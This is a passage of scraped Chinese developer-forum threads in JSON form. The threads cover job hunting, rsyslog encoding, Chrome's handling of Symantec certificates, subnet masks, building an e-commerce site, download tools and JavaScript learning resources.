直接会卡掉", "找工作这种情况太多了，习惯就好", "这种小事带来这种心态只能讲找工作太少", " \r", " \r", " \r", "确实是经验太少了吧，有这样经历也挺好，算是对自己心境的修炼", "等你投了至少 100 份简历，面试过至少 10 次以后，你就知道这是怎么回事了。", "来做啥呢，工资低加班多😭。", " 说出你的故事😂😂", " 我当年毕业找工作也就是这样， TP-LINK 只在武大华科宣讲。", "想开点，这都不是事，找工作本来就是双向选择，互相不浪费时间就可以了", " 所以大神去了猪厂", "表示这是正常现象，而且谈不上狗血。\r", "收拾心情再出发", "面了 58 ，三面后说给 offer ，等了一会儿后说 HR 在开会，等明天打电话通知。一直没有消息，前天发邮件去问，得知是 HC 暂停。这种事情，以前有认识的大神说面百度的时候也遇到过，所以都不算什么事。", "多面几间吧，然后就像我一样看开了……我还通常辛辛苦苦面了几次最后黄了……", " 我会告诉你我所有面都过了，最后性格测试做完之后通知我进入人才库么……", "正常，美国也是这样，的确操蛋但是不得不接受啊", "我不会说携程秋招通过的拿到的会是实习 offer ，除非本身牛才给正式 offer", " 啥？？", " #25 之前是这样见过，就是他们秋招发的是实习 offer ，要先实习"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一台国产设备发送的 syslog 里有中文，使用 GBK 编码\n安装 rsyslog 的 Linux 使用 UTF-8 编码（目前除了这台设备，其它设备都是使用 UTF-8 编码的 syslog ），这样就无法无法处理这台国产设备发送的 GBK 编码 syslog\n所以想请教有什么办法让 rsyslog 处理 GBK 编码的 syslog 输入？谢谢！</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "请教 rsyslog 如何处理 GBK 编码的 syslog 输入？", "comment": []},
{"content": ["<div class=\"topic_content\">在一份声明中， Google Chrome 团队开发者 Ryan Sleevi 称发现赛门铁克错误颁发三万多个 SSL 证书，并且知晓后在长达一个月的不作为， Chrome 立即将赛门铁克及其所属 CA 的颁发的 SSL EV 证书（浏览器地址栏显示绿锁）降级到普通证书（灰锁），并在未来几个版本的浏览器更新中逐步过期所有赛门铁克证书。赛门铁克证书占所有活跃证书数量的 30%～ 45%，如果不是考虑到大规模瘫痪整个网络的风险， Chrome 应该一夜间吊销所有赛门铁克证书。\r<br>此次事件影响极大，国内的七牛和阿里云等网络巨头已经在过去一段时间里颁发了无数个免费赛门铁克证书。颁发及使用赛门铁克证书的公司应该立刻采取行动，更换证书。\r<br>\r<br>Google 的声明原文： <a target=\"_blank\" href=\"https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/eUAKwjihhBs\" rel=\"nofollow\">https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/eUAKwjihhBs</a>\r<br>消息来源： <a target=\"_blank\" href=\"https://arstechnica.com/security/2017/03/google-takes-symantec-to-the-woodshed-for-mis-issuing-30000-https-certs/\" rel=\"nofollow\">https://arstechnica.com/security/2017/03/google-takes-symantec-to-the-woodshed-for-mis-issuing-30000-https-certs/</a></div>"], "reply": "1", "tittle": "Google Chrome 浏览器将整治所有赛门铁克 SSL/TLS 证书", "comment": ["发在 ", " 节点比较好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近看 scrapy ，把文档看一了遍，然后找了些例子来照着写，发现例子中很多文档里没有讲到的<br>\n然后网上有时候也找不到具体的详细的解释，<br>\n我不想就一些简单的问题发帖，毕竟问题简单，而且还多<br>\n想着自己读源码来解决问题，感觉源码乱乱的<br>\n比如说有的例子里有 log ，搬过来就错， scrapy 文档里说先 start()<br>\n源码里是把 logging 改造了一下,查了一下没有 start 方法<br>\n这样的问题我一天能遇到十个<br>\n<strong>所以我想问的不是这个问题，是怎么阅读源码搞清这些东西</strong><br>\n或者大家在学习新知识的时候，怎么快速学习，并且解决小问题的</p>\n</div></div>", "<div class=\"topic_content\">本来我打了 python 节点，不知道怎么帖子就乱跑了</div>"], "reply": "6", "tittle": "请教下源码的正确阅读方式", "comment": ["我读源码是这样的，先把例子复制下来执行一遍。然后看代码实现过程和结构关系，再看出现过的函数的文档，最后试着改参数。", "啃新东西本来就是个很困难的过程\r", "网上的教程确实很乱，但是多方对比之后，你会发现虽然有很多种写法，不过都会涉及到固定的东西\r", "多交叉对比一下，再查一下不懂的名词和技术细节，你就会清楚大概的流程\r", "再看官方文档找到对应的接口，按照文档和大致原理实现一边，就差不多了\r", "\r", "另外有一些文档也有不靠谱的时候，这时候多拆分大问题为小问题，再提取关键字进行搜索（中英文都要试试）\r", "\r", "如果确实这玩意网上资料缺乏，找不到解决方案的，加相关的 qq 群问一问\r", "\r", "再解决不了的，到相关方面的论坛发帖，一般到了这一步，说明你确实是在这个问题上栽了很久了，就算等上几天才有人回帖，这问题解决了也值了。", "我初学编程，好为人师一下，不要笑我", "文档要看和当前使用版本相对应的.\r", "\r", "文档不全的时候要看源码.\r", "\r", "中文教程有些很烂, 要有甄别能力.", " #2 是这么做的，我只是缺乏交流的地方，你说的这些都是常识了，找到有效的交流场所还是很难的", " #4 甄别能力比较差。。。是看的当前版的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://tianshuang.me/%E4%BB%8E%E4%B8%80%E9%81%93%E9%9D%A2%E8%AF%95%E9%A2%98%E5%BC%80%E5%A7%8B%E8%AF%B4%E8%B5%B7/index.html\" rel=\"nofollow\">https://tianshuang.me/%E4%BB%8E%E4%B8%80%E9%81%93%E9%9D%A2%E8%AF%95%E9%A2%98%E5%BC%80%E5%A7%8B%E8%AF%B4%E8%B5%B7/index.html</a></p>\n</div></div>"], "reply": "13", "tittle": "两台服务器 A 和 B ， B 的子网掩码本应该是 255.255.255.0，被不小心配成了 255.255.255.224。它们还能正常通信吗？", "comment": ["取决于你 B 的地址本身以及网关具体是多少，你发出来看看！", "能 ， A 的网络号一定得是 /27", "看到这个第一时间想起了《 Wireshark 网络分析就这么简单》", "ICMP redirection.", "牵涉子网掩码运算， 255.255.255.224 的分割出的子网 ip 数量是 32.\r", "如果在一个子网内，是可以的，\r", "举个栗子\r", "比如 a ip 末尾是 1 b 末尾是 2 是通的\r", "另外一种情况则不行  如 a 末尾 1 ， b 末尾 33", "能", "ip1:        1 0 0 1\r", "mask1: 1 1 1 0 \r", "--------------------\r", "ip2:        1 0 1 0\r", "mask2: 1 1 0 0\r", "\r", "1. ip1 to ip2\r", "\r", "ip1:           1 0 0 1\r", "mask1:    1 1 1 0\r", "---------------------\r", "                   1 0 0|1\r", "\r", "ip2:           1 0 1 0\r", "mask1:    1 1 1 0\r", "---------------------\r", "                   1 0 1|0\r", "100 != 101 NO!!!\r", "\r", "2.ip2 to ip1\r", "\r", "ip2:           1 0 1 0\r", "mask2:    1 1 0 0\r", "---------------------\r", "                   1 0|1 0\r", "\r", "ip1:           1 0 0 1\r", "mask2:    1 1 0 0\r", "---------------------\r", "                   1 0|0 1\r", "10 == 10 YES!!!", "应该是没有问题，我想这个是不是和路由汇总比较类似？超网应该就是这样实现的，不对，我犯了个非常严重的错误，路由的话不用去考虑网关的问题，根据题意，服务器 B 正好处于 192.168.26.0 这个网络中，所以通讯应该是没有问题，但是要是把服务器 A 和服务器 B 调过来的话，恐怕根本不能配置成功。不好意，有点乱，似乎还有点跑题。等周一问一下老师，看老师是怎么说的。", " 可以自己在纸上手动算算  根据 自己的子网掩码分别与两个 IP 相与得到网络地址", " 我也是,开篇第一节", " 最近的课堂作业是给一个超级大的网络做子网划分，/24 的网络已经不用去算了，从 /16 到 /30 的网络一应俱全，足足算了半个小时。这道题的网关是一样的，服务器 A 的网关和服务器 B 的网关是一样的，网络地址也是一样的，个人认为是没有问题，但是真实机器会不会出问题就不知道了，毕竟现实和理论总是有差距，打算上课问问老师，然后有时间再用真实机做实验，机房的电脑正好符合实验条件。", " 网关是一样的  但在 B 看来， A 属于不同子网", " 使用 Cisco Packet Tracer 做实验，一台路由器（ 1941 ）一台交换机（ 2960 ），两台服务器，结果是不通的。用包追踪来看， A 到 B ， ping 包根本不能从 A 发出。但是从 B 发到 A 结果就不一样了，虽然还是不通但是 ping 包已经通过路由器到达 A 了，但是 A 无法返回给 B 。然后又用两台物理机做实验，用交叉线链接起来，按照题目设置，结果通了…… 物理机是 Windows 7 32 位旗舰版。有时间在再用路由器或者三层交换机试一下。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>做网站方面目前自己就会一点 php ，都还是多年的事了，本来现在就极少接触技术方面。</p>\n<p>但是目前想做一套 B2B+自营的商城。\n实现：\n1 ：基本注册下单评价之类\n2 ：商家入驻\n3 ：自营模式\n4 ：支付接口\n5 ：邀请好友奖励\n6 ：分类和商品的连接可以自定义\n7 ：手机版本</p>\n<p>原本想直接用网上现有的程序，但是都不怎么满意，特别是绝大多数都还限制使用 php5.3 版本。\n就实现以上的功能，我现在要是重头开始，需要学习那些知识点？</p>\n<p>我想做垂直行业的 B2B ，要是有小伙伴愿意一起玩的，也可以勾搭先。</p>\n</div></div>"], "reply": "38", "tittle": "从 0 开始做一套 B2B 商城，需要多久时间？", "comment": ["头像看着舒服\r", "独立主导开发这样功能齐全的商城  \r", "应该不会出现在这里吧", "看业务复杂度以及团队靠谱程度，如果业务简单，队友都专业，那么作为 php 后端，理想情况下我实现用户登录注册花 1 天，实现用户简单的商品发布修改花 1 天，实现用户购物车花 1 天，实现用户下单和一种简单支付花 1 天，实现买家与卖家对订单状态的简单更新与售后记录花 1 天，增加买家与卖家区分限制以及平台对卖家入住审核花 1 天，增加用户邀请与奖励涉及的简单优惠机制花 1 天，给商品增加分类机制花 1 天，平台对用户、商品、订单、入驻、优惠的简单修改花 2 天，实际情况请对以上时间乘以 5 你就可以得到一个由只一个 php 后端程序员写的完全不考虑前端体验的、手机与前端共用一套 api 的 B2B 商城。", "当年独立做过一个类似的东西，不过是 2C 的，三个月每天工作 15 个小时以上并且没有节假日做了个基本雏形拥有所有规划中的功能无明显 BUG 并且可以上线运行，接下来三个月对各个模块细节方面进行了进一步完善，在第七个月的时候因为迟迟拿不到融资，公司倒闭，心血全白费。全体员工少的被拖欠一个月工资，多的被拖欠四个月工资。\r", "一般来说建议你先找套现成的用着先，等到公司业务稳定下来，现成的满足不了需求再着手自己开发吧。", "现成的东西 哪怕你在看不顺眼，也比你自己从头做要好。\r", "说真的，业务先行 才是真理。。", "之前做了两个月，后端用 NodeJS+Rethinkdb 微信页面用自己开发的 VUX(这绝对不是广告)做了第一版，并且关键代码都花时间写了单元测试，上线基本无 bug 然后前端小迭代。但是后来 Rethinkdb 倒闭了，现在正在准备迁移到其他数据库。有一些东西看起来简单，但是一旦考虑到安全问题，边缘条件，业务限制，即使一个优惠券的逻辑就相应复杂了。所以要提前画好流程图方便写测试。。", "哈哈，这个可就是大坑了。。。不建议自己做\r", "一个团队， 10 个人，耗时接近 8 个月，做 b2b 加 app （双端）。做出来 bug 一堆，勉强能用，还没找到融资，估计坚持不了多久", "前段时间刚提一个人做完一个类似闲鱼的商城。需要可以联系。", " 对，流程图真的是太重要了。另外说一句 vux 挺好用的", "我之前做了俩多月才跑稳 ... 购物流程也就两周就完事了 ... 之后商家入驻那里就各种麻烦 ...", "看了一眼楼上的亲身经历，感觉 100 个人月应该差不多吧。\r", "楼主有 100 万启动资金可以烧么……", " 多少个人参与开发的？", "是个巨坑，我一个人开发了半年， pc 和手机端能用，只能说能用", "可以交流一下，正在跟朋友打算搞一套商城", "我当初一个人花了大概 2 个月吧，写出来一个凑合能用的，前端用的 bootstrap 。上线到现在。万事开头难，其实是在说开头并不需要大而全，基本的骨架搞定就可以了。以后的需求来了，再修改。", "个人如果想开发的话 就是个无底洞。。", "买一套多少钱呀··我做外贸的想买一套做网站用\r", "\r", "不要总想着自己搞 , 有钱一起赚 , 专业的人做专业的事 , 很多公司做商城出来卖, 建议选套合适的 , 楼上说得好 ,业务先行  .", "你手下 10 人全部靠谱并有相关行业经验的前提下，至少半年。并且前提是你的业务逻辑与需求清晰，不会频繁返工。", " 一个后端熟手一个前端熟手+三个新手", "只好推荐一把了\r", "\r", "1 小时？", "\r", "Sylius/Sylius ", "  [MIT] \r", "ant-vel/App ", "  [MIT] \r", "shopware/shopware  [AGPL] \r", "PrestaShop/PrestaShop  [OSL] \r", "\r", "虽然自己改起来也麻烦 但比从头弄快些，而且成熟的框架还有 app/插件市场 你可以去买 /卖你的修改的 app/插件", " @", " 不建议自己开发，我去年做过一套生鲜配送的，后台加 iOS 、 Android 两端，客户现在还在用。\r", "基本上你说的功能都有了，需要定制的话可以找我。", "最简单的那种 5 个人一个月的样子吧", " 费用要多少", " \r", " \r", "\r", "怎么联系呢？", "去年 9 月份接了个类似的项目（商城 （ B2B2C ）+ CRM) ，也是重头开始做的到目前基本功能算是完成了，基于 php5.6,用的 slim 框架，数据库访问层用的 eloquent 。\r", "\r", "我赞成楼主重新开发（可能我比较讨厌看别人的代码，更不要说去修改别人的代码了 (￣▽￣) ），但是我也不推荐完整的重新做，某些模块应该擅于从开源项目中抽离出来整合到自己系统，比如购物车，商品模块，订单模块一切你觉得可以对你的系统有帮助可参考的都可以的。", "为啥你们开发效率这么的高啊,个把月就开发个东西出来\r", "\r", "我这里 3 个前端 8+4 个后端,5 个月才差不多开始商用(出售)", " \r", " \r", "请加我微信详谈： ldehai ，注明来自 v2", "从头做，得先找一个靠谱的产品经理和一个架构师", " \r", " \r", "\r", "请联系邮箱。可提供已部署上线可供测试\r", "关键是需求，以及需要支持的数据规模。能支持 1000 用户和 10000 用户的产品架构是不一样的，做一个和淘宝功能一样的网站和做一个淘宝是 2 回事", " 微信搜索不到\r", "\r", " 好的·", "曾经用 2 个多月自己做出来过\r", "不过那是没有 app 的年代，只是制作了移动版\r", "而且那个年代前端技术没像现在这样，基本自己只需要结合 jquery 做一些 ajax\r", "\r", "这么大的项目要看架构能力的，不是简单一个入门程序员就能搞得利索的，否则就是 BUG 一片", " 有啥联系方式没", " 大概什么价？", "  wechat : emhvdTYyNjg3NTY1MQo", " 比自己从头开发要便宜得多，具体可以加我微信聊，微信 id 跟 v2 的 id 一样"]},
{"content": "", "reply": "23", "tittle": "有人知道做 FlashGet 的 侯延堂 现在在做什么么？", "comment": ["也许沉迷于王者 nongyao 吧。。。\r", "\r", "真有点怀念，可能更多地是不喜欢现在的 Thunder 吧，来个旗鼓相当的竞品呀。。。", "Flash 都要倒了 何况是 FlashGet\r", "\r", "\r", " 活下来就是一样的了", " #2  ", "   兄弟你故意的么，拿 FlashGet 去下载 Flash 么，还是说 FlashGet 的没落已经敲响了 Flash 的丧钟。。。", " \r", " \r", "flash 和 flashget 有什么关系吗。。。", "  类似 雷锋和雷峰塔的关系吧", "不是做页游么（也可能是记错了", " 也可能是张无忌和长孙无忌 或者 java 和 javascript", " \r", " \r", " \r", "曾经 21M 的 flash 下载了 8 个小时，如果不用 flashget ，也只能用网络蚂蚁了。\r", "\r", "后来再见到 flashget 的时候，和迅雷差不多了。再后来如果继续发展，估计也是差不多的路线和赚钱方式。", " \r", "java 和 javascript 的关系 233333", "还在玩传奇吧！不过可能是私服", "搭车请教一下，对于开头是 http 和 ftp 的现在链接，除了迅雷和浏览器，现在还有啥好用的下载工具", " aria2", " IDM", "当年沉迷于游戏了，后来不知道", "当年装机必备。。印象最深下了最终幻想 MV", "引用:\r", "> \"迅雷创始人在谈及自己的创业史时提到，感谢魔兽世界，当年迅雷被网际快车(FlashGet)压制的时候，网际快车创始人侯延堂迷恋魔兽世界，停止更新软件长达一年，市场份额被迅雷迅速占领。“ \r", "\r", "\r", "\r", "当时是沉迷 WOW, 现在不知道在做什么, :).\r", "\r", "迅雷当时在下载速度这块, 用了 p2sp 这种技术, 对用户的吸引超过了 flashget.", " V2EX 跟 v2porn 是啥关系？", "快车卖给黄明明 1000 万，已经移民加拿大了", " 不是熊俊吗 - -", " 业内人士不少，熊俊在搞同步推", "没用，即使他继续维护，被迅雷搞死也是 1 2 3 的情况。 flashget 只是第二代下载，迅雷是有中心节点 有 cdn 可以调度 解决死链接的。这个是 flashget 追不上的。 flashget 是一只军队，人人可以打 9 环。迅雷的军队只能打 8 环，但是迅雷有空军，还有大炮。最后结局就很清楚了。", "后来好像去暴雪开发魔兽世界了", "顺带求推荐下载 ED2K 链接，除了迅雷还有别的软件吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想做一款朋友之间收藏集展示的产品，前前后后思考了半年多了，产品定位、发展规划都仔细考虑过，第一版的原型也设计好了，就差神奇的程序猿了，哈哈....我是做需求的，不懂技术，苦逼；</p>\n<p>有朋友想一起讨论的，可以详聊。</p>\n</div></div>", "<div class=\"topic_content\">感觉要沉了，好慌，赶紧再来补充一下，哈哈。\r<br>\r<br>收藏+社交产品，类似谷歌 G+的收藏集，对产品没兴趣，给点意见，交个朋友也可以，再次先谢过了。</div>"], "reply": "4", "tittle": "有没有对工具+社交类产品感兴趣的朋友", "comment": ["没有", "就差一个程序员系列", " 这个系列是个苦情剧", "而程序员是就差投资系列"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>希望是跟实验室的方向 Information Retrieve 和 Data Mining 相关，有点意思的想法</p>\n<p>不希望做的太水 or 太无聊</p>\n<p>谢谢各位，也看看大家有啥脑洞😁</p>\n</div></div>", "<div class=\"topic_content\">昨晚想了一发..准备爬取学校的论坛然后做个问答引擎...\r<br>各位怎么看</div>"], "reply": "12", "tittle": "本科毕设不知道做啥，大家能提提建议么", "comment": ["同样毕设不知道做什么", "都快 4 月了还没开题吗？\r", "善用搜索，这问题很多人问过。", "当年我们十一月就定了。。答辩三次", " 开题随便填的...之后可以改", "爬 B 站弹幕和百度指数，看网络热词在 B 站爆发和起源的情况？", "一起做 ed2k 和 kad 协议的 node 实现吧， ", "当年这个时候，都在玩啦～", "模仿扎克伯格，写一个机器人", "我去年毕设是写一个编译器，用 Python 的 lex ， yacc 库很容易写 ", "去年做了个人脸识别开锁。。。。\r", "\r", "让我直接二辩了，不知道为什么。。。", "爬虫，然后根据数据分析和预测", "文言文翻译"]},
{"content": ["<div class=\"topic_content\">四大金刚相继出走，发生什么了？</div>"], "reply": "目前尚无回", "tittle": "有百度的程序员么，百度最近怎么了？", "comment": []},
{"content": ["<div class=\"topic_content\">如题，最近在捣鼓 LDAP ， CAS 相关的东西，发现 ApacheDS 有一些权限方面的文档\r<br><a target=\"_blank\" href=\"http://directory.apache.org/apacheds/advanced-ug/4.2-authorization.html\" rel=\"nofollow\">http://directory.apache.org/apacheds/advanced-ug/4.2-authorization.html</a>\r<br>找了几个例子配置之后，用 Apache Directory Studio 或者是 Apache LDAP API 貌似都没有相关权限效果，也就是随便用一个用户登录到后台都能进行增加，删除操作。\r<br>请指教......</div>"], "reply": "目前尚无回", "tittle": "ApacheDS 权限方面如何设置？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>ned2k 是一个 ed2k 和 kad 协议的 nodejs 实现，其目的是考虑到网盘越来越和谐，同时现在仍然有很多资源是 ed2k 协议的，并且没有服务器端可用的 client 实现(可以用到公网，高速带宽和高并发)，因此怒而造轮子。</p>\n<p>目前项目已经完成了 client to server 的部分，还剩下许多东西需要造，如果有感兴趣的话大家可以一起来完成这个项目，地址: <a href=\"http://github.com/ned2k/ned2k\" rel=\"nofollow\">github.com/ned2k/ned2k</a></p>\n</div></div>"], "reply": "15", "tittle": "[ned2k]一个 ed2k 和 kad 协议的 nodejs 实现", "comment": ["不错，可以关注一下。", "只要有 server 就免不了和谐的问题", "这个厉害了", "能给 kad 添加 ipv6 支持不， eMule 那群人一直不上。", " 可以的，计划当中", " 可以走 kad 协议", " 感谢关注", "amule 、 mldonkey 这两都可以在 Linux 命令行下跑，记住不能开发成只下载不上传的吸血软件。这样会被大家屏蔽。", " ned2k 的目标是一个协议实现的库，以便可以和爬虫， http server 等很好的结合😆", "会点 nodejs 应该帮不上忙", "之前用 Aria2 在 VPS 做离线时时就一直在想怎么都没看到支持 ed2k 的哦，找了半天都没找到，现在有生之年终于看到了！\r", "坐等完成啦！", "cool👍", "楼主 会考虑 nodejs 的工作不？", " 感谢，目前没有需求", " 么么哒"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p><a href=\"www.shurenyun.com\" rel=\"nofollow\">数人云</a>围绕自动化运维的主题做了几期线下活动，报名量和后期文章实录的阅读量较之前都有很大的提升，小数感叹 DevOps 和 SRE 如此深入人心，也正是大家的积极关注，才能让新技术在更短的时间里得到最好地验证：）</p>\n<p>译文将阐述 DevOps 智能化的七大优势，构建灵动新 IT~</p>\n</blockquote>\n<p>著名的《 The Phoenix Project 》一书中，笔者最爱的部分是在这个虚构的公司，当 DevOps 英雄、 IT 运维部的副总 Bill Palmer 灵光一闪的那一刻，他意识到 IT 对于商业具有重要意义。</p>\n<p>那一刻来自公司的 CFO 为 Bill 列出了他如何努力让部门的目标与公司整体业务的目标保持一致。 Bill 由此意识到他必须采取类似的措施。最终，他转而专注交付过程的数据，从而提高 IT 的效率，使他的团队免于外包的命运—— DevOps 团队从此诞生。</p>\n<p>现实中可能不会有这样极端而可怕的例子，但是，许多 IT 团队转型到 DevOps 尚未采取下一个步骤：使用 DevOps 智能化实现数据驱动决策，帮助他们改进软件交付。</p>\n<h2>什么是 DevOps 智能化？</h2>\n<p>DevOps 智能化为公司提供情报和洞察力，使之更有效地进行软件交付，风险更少，效益更高。随着应用程序开发的复杂性不断增加，采用 DevOps 智能化变得至关重要。以下是 2017 年 DevOps 智能化跃居首位的七大优势：</p>\n<h3>更快的发布周期</h3>\n<p>交付流程中的端到端智能可以帮助我们优化流程， 加速发布周期。 DevOps 智能化提供了实时的、可操作信息，可以识别资源浪费，例如 Pipeline 中的瓶颈问题。同时可以快速找出系统执行的新变化，监控部署的成功率，观察每个团队的迭代时间，鉴别哪些流程是正常工作的，哪些是消极影响交付时间的。</p>\n<h3>更高的软件质量</h3>\n<p>DevOps 智能化让迭代开发的基础——反馈回路成立。反馈回路鼓励创造力，对于喜欢尝试新功能或修改接口来说非常有价值，从而确保构建更多客户期待的特性。反馈回路可以成为软件开发和交付过程中一个不可分割的组成部分。</p>\n<h3>提升软件的商业价值</h3>\n<p>DevOps 智能化可以让你快速获得许多可操作的信息，比如客户使用了哪些特性，放弃了哪些流程，或者是否改变了操作行为。 DevOps 智能化在发布后也可以挖掘信息来支持各种分析，这样就能发现向客户交付的内容是否有价值，从而对未来产品做出更明智的决策。</p>\n<h3>更高的透明度</h3>\n<p>对整个 Pipeline 的洞察提供了端到端的透明度。清晰、实时、可见的过程让你更容易理解为什么能够(或不能)实现目标，从而判断额外时间和资源上的请求，并进行相应的准备，而不是由日历日期来驱动版本。透明度也意味着非 IT 人员也可以很容易地跟踪任何给定的进程，能够基于实时数据做出业务决策，而无需经过 IT 训练。</p>\n<h3>前瞻性管理交付进程</h3>\n<p>DevOps 智能化便于我们了解应用、人员环境等的实时和历史信息。实时可行的洞悉有很多优势，例如提供早期预警，提前预知失败并将其阻止，而不是等它发生以后浪费时间去消除；而历史数据可以基于过去的结果分析趋势和预测行为。</p>\n<h3>对合规要求更好的支持</h3>\n<p>收集进程的数据不仅显示了如何优化这些进程，也展示了在一个可审计的改变中发生的事情。过程遵循了吗？是谁在什么时间操作的？什么挂掉了？采取了什么措施？是正确的吗？ DevOps 智能化帮助你掌握合规要求并解决问题。</p>\n<h3>更强的 DevOps 文化</h3>\n<p>交付过程的智能有助于增强 DevOps 文化，它通过授权 IT 内外部的人员来影响变化，从而努力改善过程和产品。 DevOps 智能化提供了对于成就和闪光点的洞察，它作为一个重要的角色在帮助公司做出有效的决策，增强了与人分享数据业务的能力。</p>\n<p>随着公司提高他们的 DevOps 成熟度和实现发布编制，公司建造的基础设施需要自动捕获和分析 DevOps 数据并将其转化为可操作的信息。有了 DevOps ， IT 部门将能够支持公司业务目标。</p>\n<p>作者： Lisa Wells</p>\n<p>原文： DevOps Intelligence Changes the Game\n<a href=\"https://dzone.com/articles/devops-intelligence-changes-the-game\" rel=\"nofollow\">https://dzone.com/articles/devops-intelligence-changes-the-game</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "译文 | 改变游戏规则的 DevOps 智能化", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>以前在 arch 也碰到过这个问题</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "fedroa25 在桌面右键打开终端就会闪退", "comment": []},
{"content": ["<div class=\"topic_content\">但是更简陋（简洁？）\r<br>\r<br>基于 itchat ， 106 行代码。\r<br>\r<br><a target=\"_blank\" href=\"https://github.com/picasso250/wechat-cli\" rel=\"nofollow\">https://github.com/picasso250/wechat-cli</a>\r<br>\r<br>比较好的地方是：真·在命令行里显示的二维码。</div>"], "reply": "5", "tittle": "又一个微信命令行版", "comment": ["很好奇命令行里的二维码，不过不知道这个要怎么用呢？", "装了之后看了看代码...没看懂怎么用...麻烦稍微指点下？", " itchat.autologin()", " pip 后，好像直接运行 git 那文件，就可以了，好神奇的，不过我也不知道咋用", "ImportError: No module named 'readline'\r", "不支持 windows so sad"]},
{"content": ["<div class=\"topic_content\">如题；</div>", "<div class=\"topic_content\"><a target=\"_blank\" href=\"https://www.v2ex.com/t/348879#reply296\" rel=\"nofollow\">https://www.v2ex.com/t/348879#reply296</a></div>"], "reply": "1", "tittle": "有一个主题 我看大家讨论很多。但我就是无法跳转到那个主题上：\r\n“我搞了个 PHP 培训，针对 3 年以下的 PHPer，然而他们真的让我很失望！我现在怀疑自己做错了吗？”\r\n只有我打不开吗？", "comment": ["我在非登陆状态下，换用手机网络，手机浏览器也无法打开。"]},
{"content": ["<div class=\"topic_content\">本人已有其它语言编程的经验，现在想学 JavaScript 语言，注意不是想学前端编程，而是学 JavaScript 语言本身，以及其所有最新特性。请各位推荐些书籍和资源以及路线图等。</div>"], "reply": "29", "tittle": "各位过来人，怎么学 JavaScript，有没有书籍或在线资源推荐？", "comment": ["<you don't know js>\r", "<JavaScript Promise 迷你书>\r", "<JavaScript 语言精粹>\r", "\r", "看过或正在看的，感觉还不错", "有编程经验，想学 JS 本身的： you don't know js 不二之选。", "同推荐 you don't know js", "《 JavaScript 从入门到放弃》", " 中文的，虽然看着有点 low ，但是入门的话简单快速，学 Javascript 基础足够。\r", "学完基础就要深入一下了，先了解什么是“闭包”、“作用域链”和“原型链”，这些在网上搜文章一搜一大堆，一开始理解比较抽象，多看多试就好了。\r", "然后是前沿一点的，建议直接上 ES6 和 ES7 ，这个教程很薄，有纸质书可以买 ", "\r", "上面都学完就可以分专业了，你是要做客户端（浏览器端）开发还是服务端开发。\r", "\r", "客户端开发的话就从 jQuery 开始，依然是那个中文网站， ", "  简单粗暴，差不多一两天也就能学会了，还是要多练习。\r", "之后就是接触一些前端框架， React 、 VUE2 、 Angular2 等，自己去网上搜什么时候要用这些框架以及什么情况向选择哪个框架。\r", "\r", "服务端的话主要就是 Node.js ，这个国内资料不是特别新，需要基本的看英文文档的能力，可以从 Node.js 官网入手， ", " 看书的话《 Node.js 实战》和《深入浅出 Node.js 》好像都行，不过纸质书上的东西有很多都过时了， 学的话建议从 Node.js v7.0.0 开始，因为等你学完 v8.0.0 差不多就出来了。\r", "基础学完就可以接触一些 WEB 框架了， Express 、 Koa 都可以，同样自己去网上搜他们的对比以及什么情况下适合用哪个。\r", "\r", "上面都学完之后就可以回来这里想我一样写老多回复忽悠新人了~~~", " +1\r", "补充下，如果英文比较好，可以看对应的英文网站 ", " ，这个质量更高一些。", "我就看看", "恩，来看看推荐", " 你怎么不教一些新人呢，你不是发表了很多关于 JS 的文章吗？应该对 JS 很熟悉才对吧。", " 更正： 一些 -> 一下", "犀牛书。红宝书。这都是必看的。", "做个项目就好了 要不然都是吹牛计划", "\r", "\r", "这一本就够\r", "记得多写代码少 YY 自然而然就熟练起来了", "千万别一上来就看犀牛书，你会炸的，推荐你看 js 高级程序设计第三版", "直接开撸，用着用着，遇到坑多了，就会了", "JavaScript The Good Parts 这本也很不错，加上之前 1L 说的那三本，看完之后 JS 就可以随便撸了", "强烈推荐《 JavaScript DOM 编程艺术》，这本书偏前端。刷完这本书，才感觉自己在编程这条路上入门了。\r", "再推进一本《 Node 与 Express 开发》，只是这本书里面的内容版本偏老。", "《你不知道的 javascript 卷一》不错，要深入理解感觉还是直接看官方 spec 好点儿", "入门之后推荐“ javascript 秘密花园”，东西不多，可以扫扫，补充知识盲区", "个人推荐 《 Eloquent JavaScript 》，可以在线看 ", "\r", "这本书把内容分为 语言基础，浏览器编程和服务端编程 3 部分。语言基础部分也都涉及了“闭包”，“原型链”等内容。\r", "缺点是里面不涉及任何 ES6 的部分，所以同样建议看完基础后能看一下  ", " 《 Eloquent JavaScript 》确实非常赞。我认为它至少是 top 2 的 JavaScript 书籍。", "听说 MDN 比 w3school 好\r", "\r", "javascript 秘密花园", "Codecademy", "如果你是新手，犀牛书绝对别碰， Eloquent JavaScript 也不是给新手看得，最好的选择是 JavaScript 高级程序设计，同时这本书的作者还有很多著作，入门后最好都买来", "JavaScript DOM 编程艺术 忘记这本了\r", "\r", "JavaScript DOM 编程艺术 > JavaScript 高级程序设计", "单纯学习 JavaScript 本身的话\r", "JavaScript 高级程序设计 前几章语言基础 > Understanding ECMAScript 6", "犀牛书是字典，不是用来看的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如果支持 github 之类的代码本地 clone 就更好了。</p>\n</div></div>"], "reply": "4", "tittle": "如果想在 pad 上看项目的源码，有啥好的 app 或 cloud service？", "comment": ["codehub", "Working Copy\r", "TIG\r", "Textastic", "TIG 原价 128 ，现在好像限免", "Git2Go"]},
